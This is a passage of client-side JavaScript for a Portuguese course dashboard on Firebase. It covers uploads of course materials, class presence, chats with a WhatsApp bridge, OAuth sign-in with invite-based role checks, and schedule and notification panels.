            if (url && !isSafeUrl(url)) {
                alert('URL inválido. Usa apenas http:// ou https://');
                return;
            }
            if (url && getYouTubeId(url)) type = 'video';

            const matKey = currentSessionKey || currentUCCode;
            const uid = auth.currentUser?.uid;
            if (!uid) return;
            const item = {
                id: `${Date.now()}_${Math.random().toString(36).slice(2)}`,
                type, label: label || url, url, uid, createdAt: Date.now()
            };
            try {
                await db.collection('materials').doc(matKey).set({
                    items: firebase.firestore.FieldValue.arrayUnion(item)
                }, { merge: true });
                delete materialsCache[matKey];
                const list = await getMaterials(matKey);
                renderMaterials(list);
            } catch (e) {
                console.error('Erro ao adicionar material:', e);
                alert('Erro ao guardar material.');
            }

            document.getElementById('mat-label') && (document.getElementById('mat-label').value = '');
            document.getElementById('mat-url')   && (document.getElementById('mat-url').value   = '');
        }

        function openMaterial(index) {
            const matKey = currentSessionKey || currentUCCode;
            const list = materialsCache[matKey] || [];
            const item = list[index];
            if (item && item.url) {
                if (!isSafeUrl(item.url)) {
                    alert('URL bloqueado por segurança.');
                    return;
                }
                window.open(item.url, '_blank', 'noopener,noreferrer');
            }
        }

        async function deleteMaterial(index) {
            const matKey = currentSessionKey || currentUCCode;
            if (!confirm('Remover este material?')) return;
            try {
                const doc = await db.collection('materials').doc(matKey).get();
                const items = doc.exists ? [...(doc.data().items || [])] : [];
                items.splice(index, 1);
                await db.collection('materials').doc(matKey).set({ items });
                delete materialsCache[matKey];
                const updated = await getMaterials(matKey);
                renderMaterials(updated);
            } catch (e) {
                console.error('Erro ao apagar material:', e);
                alert('Erro ao apagar material.');
            }
        }

        function handleFileSelect(event) {
            const file = event.target.files[0];
            if (!file) return;
            processFile(file);
            event.target.value = '';
        }

        async function processFile(file) {
            const MAX_SIZE = 4 * 1024 * 1024; // 4 MB
            if (file.size > MAX_SIZE) {
                alert(`Ficheiro demasiado grande (${(file.size/1024/1024).toFixed(1)} MB).\\nMáximo: 4 MB. Para ficheiros maiores usa um link (Google Drive, Dropbox…).`);
                return;
            }
            const EXT_TYPE_MAP = {
                pdf:'application/pdf', doc:'application/msword',
                docx:'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                ppt:'application/vnd.ms-powerpoint',
                pptx:'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                xls:'application/vnd.ms-excel',
                xlsx:'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                txt:'text/plain', md:'text/markdown', html:'text/html',
                png:'image/png', jpg:'image/jpeg', jpeg:'image/jpeg',
                gif:'image/gif', webp:'image/webp', zip:'application/zip'
            };
            const ext = file.name.split('.').pop().toLowerCase();
            const contentType = EXT_TYPE_MAP[ext];
            if (!contentType) {
                alert('Tipo de ficheiro não permitido. Usa PDF, Word, PowerPoint, imagem ou ZIP.');
                return;
            }

            const zone = document.getElementById('file-drop-zone');
            zone.innerHTML = '⏳ A enviar ficheiro...';
            zone.style.pointerEvents = 'none';

            let uploadedUrl = null;
            try {
                const safeName = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
                const key      = `${Date.now()}-${safeName}`;
                const uid      = auth.currentUser?.uid || 'unknown';
                const ref      = storage.ref(`uc-files/${uid}/${key}`);
                const snapshot = await ref.put(file, { contentType });
                uploadedUrl    = await snapshot.ref.getDownloadURL();
            } catch (e) {
                console.error('[Storage] upload error:', e);
                alert(`Erro ao enviar para Storage: ${e.message || e.code || e}`);
                return;
            }

            try {
                const typeMap = { pdf:'pdf', doc:'doc', docx:'doc', ppt:'slide', pptx:'slide',
                                   xls:'doc', xlsx:'doc', png:'outro', jpg:'outro', jpeg:'outro',
                                   gif:'outro', webp:'outro', txt:'doc', md:'doc', html:'html', zip:'outro' };
                const matType = typeMap[ext] || 'outro';
                const matSize = `${(file.size/1024).toFixed(0)} KB`;
                const matKey  = currentSessionKey || currentUCCode;
                const uid = auth.currentUser?.uid;
                const item = {
                    id: `${Date.now()}_${Math.random().toString(36).slice(2)}`,
                    type: matType, label: file.name, url: uploadedUrl, size: matSize,
                    uid, createdAt: Date.now()
                };
                await db.collection('materials').doc(matKey).set({
                    items: firebase.firestore.FieldValue.arrayUnion(item)
                }, { merge: true });
                delete materialsCache[matKey];
                const list = await getMaterials(matKey);
                renderMaterials(list);
            } catch (e) {
                console.error('[Firestore] register material error:', e);
                alert(`Ficheiro enviado mas erro ao registar: ${e.message}`);
            } finally {
                zone.innerHTML = '📂 Arrastar ficheiro ou clicar para selecionar<input type="file" id="file-input" accept=".pdf,.doc,.docx,.ppt,.pptx,.txt,.md,.png,.jpg,.zip,.html">';
                const fi = zone.querySelector('#file-input');
                if (fi) fi.addEventListener('change', e => handleFileSelect(e));
                zone.style.pointerEvents = '';
            }
        }

        // Drag and drop on file zone
        function setupFileDrop() {
            const zone = document.getElementById('file-drop-zone');
            if (!zone) return;
            zone.addEventListener('dragover', e => { e.preventDefault(); zone.classList.add('drag-over'); });
            zone.addEventListener('dragleave', () => zone.classList.remove('drag-over'));
            zone.addEventListener('drop', e => {
                e.preventDefault();
                zone.classList.remove('drag-over');
                const file = e.dataTransfer.files[0];
                if (file) processFile(file);
            });
        }


        // ── TURMA ────────────────────────────────────────────────────────
        async function userPresenceWrite(user) {
            if (!user) return;
            try {
                await db.collection('users').doc(user.uid).set({
                    uid:         user.uid,
                    email:       user.email || '',
                    displayName: user.displayName || user.email || 'Anónimo',
                    photoURL:    user.photoURL || '',
                    lastSeen:    firebase.firestore.FieldValue.serverTimestamp()
                }, { merge: true });
            } catch(e) { console.warn('Presence write failed:', e); }
        }

        async function auditLogWrite(action, details) {
            const user = auth.currentUser;
            if (!user) return;
            try {
                await db.collection('audit_log').add({
                    uid:         user.uid,
                    email:       user.email || '',
                    displayName: user.displayName || user.email || 'Anónimo',
                    action:      action,
                    details:     details || '',
                    timestamp:   firebase.firestore.FieldValue.serverTimestamp()
                });
            } catch(e) { /* audit errors never break the app */ }
        }

        async function renderTurma() {
            // Dashboard mini chips
            const grid = document.getElementById('turma-grid');
            if (!grid) return;
            try {
                const snap = await db.collection('users').orderBy('lastSeen', 'desc').limit(40).get();
                if (snap.empty) {
                    grid.innerHTML = '<span class="jshook-muted-sm">Nenhum colega ainda.</span>';
                    applyDeferredStyles(grid);
                    return;
                }
                const uid = auth.currentUser?.uid;
                const ONLINE_MS = 5 * 60 * 1000; // 5 minutos
                const now = Date.now();
                const onlineDocs = snap.docs.filter(doc => {
                    const d = doc.data();
                    if ((d.role || 'aluno') === 'blocked') return false;
                    const ls = d.lastSeen?.toDate?.();
                    // o utilizador atual conta sempre como online
                    if (d.uid === uid) return true;
                    return ls && (now - ls.getTime()) < ONLINE_MS;
                });
                if (!onlineDocs.length) {
                    grid.innerHTML = '<span class="jshook-muted-sm">Nenhum colega online.</span>';
                    applyDeferredStyles(grid);
                    return;
                }
                grid.innerHTML = onlineDocs.map(doc => {
                    const m = doc.data();
                    const initials = (m.displayName || '?').split(' ').map(w=>w[0]).join('').slice(0,2).toUpperCase();
                    const isMe = m.uid === uid;
                    const avatarHtml = m.photoURL
                        ? `<div class="turma-chip-avatar"><img src="${escapeHtml(m.photoURL)}" loading="lazy"></div>`
                        : `<div class="turma-chip-avatar">${escapeHtml(initials)}</div>`;
                    return `<div class="turma-chip online jshook-cursor-pointer" data-view="turma">
                        ${avatarHtml}
                        <span>${escapeHtml(m.displayName?.split(' ')[0] || 'Anónimo')}</span>
                    </div>`;
                }).join('');
                grid.querySelectorAll('[data-view="turma"]').forEach(el =>
                    el.addEventListener('click', () => switchView('turma'))
                );
                applyDeferredStyles(grid);
            } catch(e) {
                grid.innerHTML = '<span class="jshook-muted-sm">Não foi possível carregar.</span>';
                applyDeferredStyles(grid);
                console.warn('renderTurma:', e);
            }
        }

        async function renderTurmaView() {
            const list = document.getElementById('turma-list');
            if (!list) return;
            list.innerHTML = '<span class="jshook-muted-sm">A carregar…</span>';
            applyDeferredStyles(list);
            try {
                const snap = await db.collection('users').orderBy('lastSeen', 'desc').limit(60).get();
                if (snap.empty) {
                    list.innerHTML = '<p class="jshook-muted">Nenhum participante registado ainda.</p>';
                    applyDeferredStyles(list);
                    return;
                }
                const myUid = auth.currentUser?.uid;
                const activeDocs = snap.docs.filter(doc => (doc.data().role || 'aluno') !== 'blocked');
                if (!activeDocs.length) {
                    list.innerHTML = '<p class="jshook-muted">Nenhum participante registado ainda.</p>';
                    applyDeferredStyles(list);
                    return;
                }
                list.innerHTML = activeDocs.map(doc => {
                    const m   = doc.data();
                    const ini = (m.displayName || '?').split(' ').map(w=>w[0]).join('').slice(0,2).toUpperCase();
                    const isMe = m.uid === myUid;
                    const lastSeen = m.lastSeen?.toDate
                        ? m.lastSeen.toDate().toLocaleDateString('pt-PT', {day:'2-digit',month:'short',year:'numeric'})
                        : '–';
                    const avatarHtml = m.photoURL
                        ? `<img src="${escapeHtml(m.photoURL)}" class="jshook-avatar-img" loading="lazy">`
                        : `<div class="jshook-avatar-fallback">${escapeHtml(ini)}</div>`;
                    return `<div class="jshook-turma-row" data-accent-border="${isMe ? '1' : '0'}">
                        ${avatarHtml}
                        <div class="jshook-flex1-minw0">
                            <div class="jshook-turma-name" data-accent-text="${isMe ? '1' : '0'}">
                                ${escapeHtml(m.displayName || 'Anónimo')}${isMe ? ' <span class="jshook-tu-tag">(tu)</span>' : ''}
                            </div>
                            <div class="jshook-last-seen">último acesso: ${lastSeen}</div>
                        </div>
                    </div>`;
                }).join('');
                applyDeferredStyles(list);
            } catch(e) {
                list.innerHTML = '<p class="jshook-muted">Não foi possível carregar a lista.</p>';
                applyDeferredStyles(list);
                console.warn('renderTurmaView:', e);
            }
        }


        // ── CHAT FORMAT (links + markdown) ──────────────────────────────
        function chatFormatText(raw) {
            // Split on URLs first so they're never HTML-escaped into unclickable text
            const urlRe = /(https?:\/\/[^\s<>"']+)/g;
            const parts = raw.split(urlRe);
            return parts.map((part, i) => {
                if (i % 2 === 1) {
                    const safe = escapeHtml(part);
                    return `<a href="${safe}" target="_blank" rel="noopener noreferrer" class="chat-link">${safe}</a>`;
                }
                let s = escapeHtml(part);
                // Code blocks (``` ... ```)
                s = s.replace(/```([\s\S]*?)```/g, (_, c) =>
                    `<pre class="chat-pre"><code>${c.trim()}</code></pre>`);
                // Inline code
                s = s.replace(/`([^`\n]+)`/g, '<code class="chat-code">$1</code>');
                // Bold
                s = s.replace(/\*\*([^*\n]+)\*\*/g, '<strong>$1</strong>');
                // Italic
                s = s.replace(/\*([^*\n]+)\*/g, '<em>$1</em>');
                // Line breaks
                s = s.replace(/\n/g, '<br>');
                return s;
            }).join('');
        }

        // ── CHAT (full-page view) ────────────────────────────────────────
        function chatViewInit() {
            if (chatUnsub) return;   // already subscribed
            const q = db.collection('chat_global')
                .orderBy('timestamp', 'asc')
                .limitToLast(80);
            chatUnsub = q.onSnapshot(snap => {
                const el  = document.getElementById('chat-view-msgs');
                const uid = auth.currentUser?.uid;
                let newCount = 0;
                const msgs = [];
                snap.forEach(doc => {
                    const m = { id: doc.id, ...doc.data() };
                    if (!m.deleted) {
                        msgs.push(m);
                        if (m.timestamp?.toMillis && m.timestamp.toMillis() > chatLastRead) newCount++;
                    }
                });
                if (!el) return;
                el.innerHTML = msgs.length === 0
                    ? '<div class="chat-empty">Sem mensagens ainda. Sê o primeiro!</div>'
                    : msgs.map(m => chatBubbleHtml(m, uid, 'chat')).join('');
                applyDeferredStyles(el);
                el.scrollTop = el.scrollHeight;
                if (currentView !== 'chat') chatUpdateBadge(newCount);
                else chatMarkRead();
            }, err => console.warn('Chat error:', err));
        }

        function chatBubbleHtml(m, uid, channel) {
            const mine   = m.uid === uid;
            const delBtn = `<button class="chat-del-btn" title="Apagar" data-chat-del-ch="${channel}" data-chat-del-id="${escapeHtml(m.id)}">✕</button>`;
            const time   = m.timestamp?.toMillis
                ? new Date(m.timestamp.toMillis()).toLocaleTimeString('pt-PT', {hour:'2-digit',minute:'2-digit'})
                : '';
            return `<div class="chat-msg ${mine ? 'mine' : 'other'}">
                ${!mine ? `<div class="chat-author">${escapeHtml(m.displayName || 'Anónimo')}</div>` : ''}
                <div class="chat-bubble">${chatFormatText(m.text)}</div>
                <div class="jshook-chat-time-row">
                    <span class="chat-msg-time">${time}</span>
                    ${mine || window._isModerador ? delBtn : ''}
                </div>
            </div>`;
        }

        function chatMarkRead() {
            chatLastRead = Date.now();
            localStorage.setItem('chat_last_read', String(chatLastRead));
            chatUpdateBadge(0);
        }

        function chatUpdateBadge(count) {
            const txt = count > 9 ? '9+' : String(count);
            ['nav-chat-badge', 'mob-chat-badge'].forEach(id => {
                const b = document.getElementById(id);
                if (!b) return;
                if (count > 0) { b.textContent = txt; b.style.display = 'flex'; }
                else { b.style.display = 'none'; }
            });
        }

        // Start background subscription on login so badge updates on all views
        function chatStartBackground() {
            chatViewInit();
        }

        function chatViewKey(e) {
            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); chatViewSend(); }
        }

        async function chatViewSend() {
            const input = document.getElementById('chat-view-input');
            const text  = (input?.value || '').trim().slice(0, 2000);
            if (!text || !auth.currentUser) return;
            input.value = '';
            const user = auth.currentUser;
            await db.collection('chat_global').add({
                uid:         user.uid,
                displayName: user.displayName || user.email || 'Anónimo',
                photoURL:    user.photoURL || '',
                text,
                timestamp:   firebase.firestore.FieldValue.serverTimestamp(),
                deleted:     false
            });
        }

        async function chatDelete(channel, msgId) {
            if (!confirm('Apagar mensagem?')) return;
            if (channel === 'chat') {
                await db.collection('chat_global').doc(msgId).update({ deleted: true });
            } else {
                await db.collection('uc_chats').doc(channel)
                    .collection('messages').doc(msgId).update({ deleted: true });
            }
        }

        // ── UC CHAT ──────────────────────────────────────────────────────
        function ucChatInit(ucCode) {
            if (ucChatUnsub) { ucChatUnsub(); ucChatUnsub = null; }
            const el = document.getElementById('uc-chat-msgs');
            if (!el) return;
            el.innerHTML = '<div class="chat-empty">A carregar…</div>';
            const uid = auth.currentUser?.uid;
            const q = db.collection('uc_chats').doc(ucCode)
                .collection('messages')
                .orderBy('timestamp', 'asc')
                .limitToLast(60);
            ucChatUnsub = q.onSnapshot(snap => {
                const msgs = [];
                snap.forEach(doc => {
                    const m = { id: doc.id, ...doc.data() };
                    if (!m.deleted) msgs.push(m);
                });
                if (msgs.length === 0) {
                    el.innerHTML = '<div class="chat-empty">Sem mensagens ainda. Sê o primeiro a comentar!</div>';
                } else {
                    el.innerHTML = msgs.map(m => chatBubbleHtml(m, uid, ucCode)).join('');
                }
                applyDeferredStyles(el);
                el.scrollTop = el.scrollHeight;
            }, err => {
                console.warn('UC chat error:', err);
            });
        }

        function ucChatKey(e) {
            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); ucChatSend(); }
        }

        async function ucChatSend() {
            const input = document.getElementById('uc-chat-input');
            const text = input.value.trim().slice(0, 2000);
            if (!text || !auth.currentUser || !currentUCCode) return;
            input.value = '';
            const user = auth.currentUser;
            await db.collection('uc_chats').doc(currentUCCode)
                .collection('messages').add({
                    uid:         user.uid,
                    displayName: user.displayName || user.email || 'Anónimo',
                    photoURL:    user.photoURL || '',
                    text,
                    timestamp:   firebase.firestore.FieldValue.serverTimestamp(),
                    deleted:     false
                });
        }

        // ── WHATSAPP CHAT ────────────────────────────────────────────────
        function chatWAInit() {
            if (chatWAUnsub) return;
            const q = db.collection('chat_whatsapp')
                .orderBy('timestamp', 'asc')
                .limitToLast(80);
            chatWAUnsub = q.onSnapshot(snap => {
                const el  = document.getElementById('chat-wa-msgs');
                const uid = auth.currentUser?.uid;
                const msgs = [];
                snap.forEach(doc => {
                    const m = { id: doc.id, ...doc.data() };
                    if (!m.deleted) msgs.push(m);
                });
                if (!el) return;
                el.innerHTML = msgs.length === 0
                    ? '<div class="chat-empty">Sem mensagens ainda. Escreve algo!</div>'
                    : msgs.map(m => chatWABubbleHtml(m, uid)).join('');
                applyDeferredStyles(el);
                el.scrollTop = el.scrollHeight;
            }, err => console.warn('WA chat error:', err));
        }

        function chatWABubbleHtml(m, uid) {
            const mine   = m.uid === uid;
            const badge  = m.source === 'whatsapp'
                ? '<span class="jshook-wa-badge">📱</span>'
                : '';
            const time   = m.timestamp?.toMillis
                ? new Date(m.timestamp.toMillis()).toLocaleTimeString('pt-PT', {hour:'2-digit',minute:'2-digit'})
                : '';
            return `<div class="chat-msg ${mine ? 'mine' : 'other'}">
                ${!mine ? `<div class="chat-author">${escapeHtml(m.displayName || 'Anónimo')}${badge}</div>` : ''}
                <div class="chat-bubble">${chatFormatText(m.text)}</div>
                <span class="chat-msg-time">${time}</span>
            </div>`;
        }

        function chatWAKey(e) {
            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); chatWASend(); }
        }

        async function chatWASend() {
            const input = document.getElementById('chat-wa-input');
            const text  = (input?.value || '').trim().slice(0, 2000);
            if (!text || !auth.currentUser) return;
            input.value = '';
            const sendBtn = document.getElementById('chat-wa-send');
            if (sendBtn) sendBtn.disabled = true;
            try {
                const fn = firebase.functions().httpsCallable('whatsappSend');
                await fn({ text });
            } catch (err) {
                console.error('WA send error:', err);
                input.value = text; // restaurar texto em caso de erro
                alert('Erro ao enviar para WhatsApp: ' + (err.message || err));
            } finally {
                if (sendBtn) sendBtn.disabled = false;
            }
        }


        // ── AUTH ────────────────────────────────────────────────────────
        function showAuthGate() {
            document.getElementById('auth-gate').style.display = 'flex';
            const navInfo = document.getElementById('nav-user-info');
            if (navInfo) navInfo.style.display = 'none';
            // Re-enable auth buttons in case they were disabled during a sign-in attempt
            document.querySelectorAll('.auth-btn').forEach(b => { b.disabled = false; b.style.opacity = ''; });
        }

        function hideAuthGate() {
            document.getElementById('auth-gate').style.display = 'none';
            const user = auth.currentUser;
            if (user) {
                const name     = user.displayName || user.email || '–';
                const initials = name.split(' ').map(w => w[0]).join('').slice(0, 2).toUpperCase();
                const navInfo  = document.getElementById('nav-user-info');
                if (navInfo) {
                    document.getElementById('nav-user-avatar').textContent = initials;
                    document.getElementById('nav-user-name').textContent   = name.split(' ')[0];
                    navInfo.style.display = 'flex';
                }
                // Write user presence to Firestore for Turma panel
                userPresenceWrite(user);
                // Heartbeat every 2 min to keep lastSeen fresh
                setInterval(() => userPresenceWrite(auth.currentUser), 2 * 60 * 1000);
                // Mostrar link de admin/moderador (role já verificado em onAuthStateChanged)
                const adminLink = document.getElementById('nav-admin-link');
                if (adminLink && (window._userRole === 'admin' || window._userRole === 'moderador')) {
                    adminLink.style.display = '';
                }
                // Audit: login
                auditLogWrite('login', '');
                // Start background chat subscription (badge on all views)
                chatStartBackground();
            }
        }

        function _signInWithProvider(provider) {
            const btns = document.querySelectorAll('.auth-btn');
            const msg = document.getElementById('auth-err');
            btns.forEach(b => { b.disabled = true; b.style.opacity = '0.6'; });
            // Safety fallback: always re-enable after 20s if no navigation/callback
            const safety = setTimeout(() => {
                btns.forEach(b => { b.disabled = false; b.style.opacity = ''; });
                if (msg) { msg.textContent = 'Timeout — tenta novamente.'; msg.style.display = 'block'; }
            }, 20000);
            auth.signInWithPopup(provider).then(() => clearTimeout(safety)).catch(e => {
                clearTimeout(safety);
                if (e.code === 'auth/popup-blocked') {
                    if (msg) { msg.textContent = 'A redirecionar para login…'; msg.style.display = 'block'; }
                    auth.signInWithRedirect(provider).catch(re => {
                        btns.forEach(b => { b.disabled = false; b.style.opacity = ''; });
                        if (msg) { msg.textContent = 'Erro de redirect (' + (re.code || '') + '): ' + re.message; msg.style.display = 'block'; }
                    });
                } else if (e.code === 'auth/popup-closed-by-user') {
                    btns.forEach(b => { b.disabled = false; b.style.opacity = ''; });
                    if (msg) { msg.style.display = 'none'; }
                } else {
                    btns.forEach(b => { b.disabled = false; b.style.opacity = ''; });
                    if (msg) { msg.textContent = 'Erro (' + (e.code || e.message) + ')'; msg.style.display = 'block'; }
                }
            });
        }

        function signInWithMicrosoftPersonal() {
            const provider = new firebase.auth.OAuthProvider('microsoft.com');
            provider.setCustomParameters({ prompt: 'select_account' });
            _signInWithProvider(provider);
        }

        function signInWithGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.setCustomParameters({ prompt: 'select_account' });
            _signInWithProvider(provider);
        }

        function initAuth() {
            auth.getRedirectResult().then(result => {
                // Se voltou de redirect com utilizador → onAuthStateChanged trata
            }).catch(e => {
                if (e.code && e.code !== 'auth/no-auth-event') {
                    const msg = document.getElementById('auth-err');
                    if (msg) { msg.textContent = 'Erro de autenticação (' + e.code + '): ' + e.message; msg.style.display = 'block'; }
                }
            });
            auth.onAuthStateChanged(async user => {
                if (user) {
                    // 1. Verificar se há convite pendente e resgatar via Cloud Function
                    const pendingInvite = _readPendingInvite();
                    if (pendingInvite) {
                        localStorage.removeItem('pending_invite');
                        try {
                            // Região explícita — a função está em europe-west1, não us-central1
                            const fn = firebase.app().functions('europe-west1').httpsCallable('redeemInvite');
                            await fn({ token: pendingInvite });
                        } catch(e) {
                            console.error('Invite redeem failed:', e.code, e.message);
                        }
                    }

                    // 2. Verificar role APÓS possível resgate de convite
                    try {
                        const doc = await db.collection('users').doc(user.uid).get();
                        const role = doc.exists ? (doc.data().role || 'blocked') : 'blocked';
                        if (role === 'blocked') {
                            await auth.signOut();
                            showAuthGate();
                            const msg = document.getElementById('auth-err');
                            if (msg) {
                                msg.textContent = '🚫 Acesso não autorizado. Necessitas de um convite válido para entrar.';
                                msg.style.display = 'block';
                            }
                            return;
                        }
                        window._userRole = role;
                        window._isModerador = (role === 'moderador' || role === 'admin');
                    } catch(e) {
                        window._userRole = 'blocked';
                        window._isModerador = false;
                        showAuthGate();
                        const msg = document.getElementById('auth-err');
                        if (msg) { msg.textContent = 'Erro ao verificar acesso (' + (e.code || e.message || 'desconhecido') + '). Tenta novamente.'; msg.style.display = 'block'; }
                        return;
                    }
                    hideAuthGate();
                    if (!window._dashboardInited) {
                        window._dashboardInited = true;
                        init();
                    }
                } else {
                    window._dashboardInited = false;
                    window._userRole = null;
                    window._isModerador = false;
                    showAuthGate();
                }
            });
        }


        // ── DASHBOARD ───────────────────────────────────────────────────
        function renderDashboardGreeting() {
            const now  = new Date();
            const hour = now.getHours();
            let greet  = 'Boa tarde';
            if (hour < 12) greet = 'Bom dia';
            else if (hour >= 20) greet = 'Boa noite';
            const user = auth.currentUser;
            const first = (user?.displayName || '').split(' ')[0] || '';
            document.getElementById('dash-greeting-text').textContent = greet + (first ? `, ${first}` : '') + '!';
            document.getElementById('dash-date').textContent =
                now.toLocaleDateString('pt-PT', { weekday:'long', year:'numeric', month:'long', day:'numeric' });
        }

        // ── FILTER & VIEW TOGGLE ────────────────────────────────────────
        function filterHorario(val) {
            scheduleFilter = val.trim();
            renderHorario();
        }

        function setScheduleView(mode) {
            scheduleViewMode = mode;
            document.getElementById('btn-view-cards').classList.toggle('active', mode === 'cards');
            document.getElementById('btn-view-week').classList.toggle('active', mode === 'week');
            renderHorario();
        }

        // ── HOJE / AMANHÃ ────────────────────────────────────────────────
        function buildDayPanel(dateStr, containerId) {
            const el = document.getElementById(containerId);
            if (!el) return;

            let found = null;
            HORARIOS.forEach(horario => {
                horario.dias.forEach(dia => {
                    if (dia.data === dateStr) found = dia;
                });
            });

            if (!found) {
                el.innerHTML = '<p class="hoje-empty">Sem aulas programadas.</p>';
                return;
            }

            const merged = mergeTimeSlots(found.aulas);

            if (merged.length === 0 && !found.nota) {
                el.innerHTML = '<p class="hoje-empty">Sem aulas programadas.</p>';
                return;
            }

            if (merged.length === 0 && found.nota) {
                el.innerHTML = `<div class="aula-card empty-card holiday"><div class="aula-info"><div class="aula-desc">${escapeHtml(found.nota)}</div></div></div>`;
                return;
            }

            el.innerHTML = merged.map(aula => {
                const state       = getAulaState(dateStr, aula.hora);
                const isClickable = UC_MAP[aula.uc] ? 'clickable' : '';
                const isRemote    = aula.modalidade === 'remoto' || (aula.uc === 'UC00602') || (UC_MAP[aula.uc] && UC_MAP[aula.uc].modalidade === 'remoto');
                const remoteClass  = isRemote ? 'remote' : '';
                const remoteBadge  = isRemote
                    ? `<div class="aula-uc badge remote jshook-aula-badge">🌐 Remoto</div>` : '';
                const isTeste      = aula.tipo === 'teste';
                const testeClass   = isTeste ? 'teste' : '';
                const testeBadge   = isTeste
                    ? `<div class="aula-uc badge teste jshook-aula-badge">📝 Teste</div>` : '';
                const formadorBadge = aula.formador
                    ? `<div class="aula-uc badge jshook-aula-badge jshook-aula-badge-formador">👤 ${shortName(aula.formador)}</div>` : '';
                const clickAttr = UC_MAP[aula.uc]
                    ? `data-uc-sched="${aula.uc}"` : '';
                return `
                <div class="aula-card ${state} ${isClickable} ${remoteClass} ${testeClass}" ${clickAttr}>
                    <div class="aula-time">${aula.hora}</div>
                    <div class="aula-info">
                        <div class="aula-desc">${aula.descricao}</div>
                        <div class="jshook-aula-badges-row">
                            <div class="aula-uc badge jshook-aula-badge">${aula.uc}</div>
                            ${remoteBadge}${testeBadge}${formadorBadge}
                        </div>
                    </div>
                    ${UC_MAP[aula.uc] ? `<button class="open-uc-btn" title="Abrir disciplina">↗</button>` : ''}
                </div>`;
            }).join('');
            el.querySelectorAll('[data-uc-sched]').forEach(card =>
                card.addEventListener('click', () => openUCFromSchedule(card.dataset.ucSched))
            );
            applyDeferredStyles(el);
        }

        function buildTodayPanel() {
            const now = new Date();
            const pad = n => String(n).padStart(2, '0');
            const todayStr     = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}`;
            const tomorrowDate = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
            const tomorrowStr  = `${tomorrowDate.getFullYear()}-${pad(tomorrowDate.getMonth()+1)}-${pad(tomorrowDate.getDate())}`;

            buildDayPanel(todayStr,    'hoje-content');
            buildDayPanel(tomorrowStr, 'amanha-content');

            // Update "Amanhã" label with day-of-week
            const diasSemana = ['Domingo','Segunda','Terça','Quarta','Quinta','Sexta','Sábado'];
            const label = document.getElementById('amanha-label');
            if (label) label.textContent = `Amanhã — ${diasSemana[tomorrowDate.getDay()]}`;
        }

        // ── GLOBAL PROGRESS & UC HOURS ──────────────────────────────────
        function computeUCHours(ucCode) {
            let done = 0, scheduled = 0;
            HORARIOS.forEach(horario => {
                horario.dias.forEach(dia => {
                    const merged = mergeTimeSlots(dia.aulas);
                    merged.forEach(a => {
                        if (a.uc === ucCode) {
                            const h = calcSessionHours(a.hora);
                            scheduled += h;
                            if (getAulaState(dia.data, a.hora) === 'past') done += h;
                        }
                    });
                });
            });
            return { done, scheduled };
        }

        function renderGlobalProgress() {
            const wrap = document.getElementById('global-progress-wrap');
            if (!wrap || !CRONOGRAMA.carga_horaria) return;

            const target = (CRONOGRAMA.carga_horaria.base || 0) + (CRONOGRAMA.carga_horaria.tecnologica || 0);
            if (!target) return;

            let done = 0;
            HORARIOS.forEach(horario => {
                horario.dias.forEach(dia => {
                    const merged = mergeTimeSlots(dia.aulas);
                    merged.forEach(a => {
                        if (getAulaState(dia.data, a.hora) === 'past') {
                            done += calcSessionHours(a.hora);
                        }
                    });
                });
            });

            const pct = Math.min(100, Math.round((done / target) * 100));
            wrap.innerHTML = `
                <div class="global-progress-label">
                    <span>Progresso Curricular</span>
                    <span>${done.toFixed(0)}h / ${target}h (${pct}%)</span>
                </div>
                <div class="progress-wrap">
                    <div class="progress-fill" data-pct="${pct}"></div>
                </div>
                <div class="progress-sub">Base + Tecnológica · FCT (${CRONOGRAMA.carga_horaria.fct || 0}h) separado</div>
            `;
            applyDeferredStyles(wrap);
        }

        // ── THEME TOGGLE ────────────────────────────────────────────────
        function toggleTheme() {
            const isLight = document.documentElement.dataset.theme === 'light';
            const next = isLight ? 'dark' : 'light';
            document.documentElement.dataset.theme = next === 'dark' ? '' : 'light';
            document.getElementById('theme-toggle').textContent = next === 'light' ? '☀️' : '🌙';
            localStorage.setItem('dashboard_theme', next);
        }

        function initTheme() {
            const saved = localStorage.getItem('dashboard_theme');
            if (saved === 'light') {
                document.documentElement.dataset.theme = 'light';
                document.getElementById('theme-toggle').textContent = '☀️';
            }
        }

        // ── NOTIFICATIONS ────────────────────────────────────────────────
        function updateNotifBtn(perm) {
            const btn = document.getElementById('notif-btn');
            if (!btn) return;
            if (perm === 'granted') { btn.classList.add('active'); btn.title = 'Notificações ativas (10 min antes)'; }
            else if (perm === 'denied') { btn.classList.add('denied'); btn.title = 'Notificações bloqueadas pelo browser'; }
        }

        async function requestNotifications() {
            if (!('Notification' in window)) {
                alert('Este browser não suporta notificações.');
                return;
            }
            if (Notification.permission === 'denied') {
                alert('Notificações bloqueadas. Activa-as nas definições do browser.');
                return;
            }
            if (Notification.permission === 'granted') {
                alert('Notificações já estão ativas. Serás avisado 10 min antes de cada aula de hoje.');
                return;
            }
            const perm = await Notification.requestPermission();
            updateNotifBtn(perm);
            if (perm === 'granted') checkUpcomingClass();
        }

        function checkUpcomingClass() {
            if (!('Notification' in window) || Notification.permission !== 'granted') return;
            const now = new Date();
            const pad = n => String(n).padStart(2, '0');
            const todayStr = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}`;

            HORARIOS.forEach(horario => {
                horario.dias.forEach(dia => {
                    if (dia.data !== todayStr) return;
                    mergeTimeSlots(dia.aulas).forEach(aula => {
                        const [startStr] = aula.hora.split('-');
                        const [sh, sm]   = startStr.split(':').map(Number);
                        const classStart = new Date(now.getFullYear(), now.getMonth(), now.getDate(), sh, sm, 0);
                        const diff = classStart - now;
                        if (diff > 0 && diff <= 10 * 60 * 1000) {
                            const key = `notif_${todayStr}_${aula.hora}`;
                            if (!sessionStorage.getItem(key)) {
                                sessionStorage.setItem(key, '1');
                                const mins = Math.round(diff / 60000);
                                const prefix = aula.tipo === 'teste' ? '📝 Teste — ' : '';
                                new Notification(`Aula em ${mins} min — ${aula.hora}`, {
